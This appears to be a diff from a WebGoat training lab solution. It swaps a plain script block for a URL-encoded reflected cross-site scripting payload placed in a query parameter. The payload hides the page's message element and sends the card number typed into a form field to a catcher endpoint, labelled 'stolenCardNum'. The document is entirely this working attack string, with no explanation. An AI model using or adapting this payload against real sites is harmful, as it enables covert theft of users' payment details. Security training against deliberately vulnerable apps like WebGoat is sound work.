@@ -1,10 +1,1 @@
 http://localhost:2210/WebGoat/start.mvc#attack/297061215/900?input1=123&input2=456%3CSCRIPT%3E%0A%20%20%20%20var%20infoElements%20%3D%20document.getElementById(%22message%22)%3B%0A%0A%20%20%20%20infoElements.style.display%20%3D%20%27none%27%3B%0A%20%20%20%20XssImage%20%3D%20new%20Image%3B%0A%20%20%20%20XssImage.src%20%3D%20%22http%3A%2F%2Flocalhost%3A2210%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26stolenCardNum%3D%22%20%2B%20document.form.input1.value%3B%0A%3C%2FSCRIPT%3E
-<SCRIPT>
-    var infoElements = document.getElementById("message");
-
-    infoElements.style.display = 'none';
-    XssImage = new Image;
-    XssImage.src = "http://localhost:2210/WebGoat/catcher?PROPERTY=yes&stolenCardNum=" + document.form.input1.value;
-</SCRIPT>
-
-
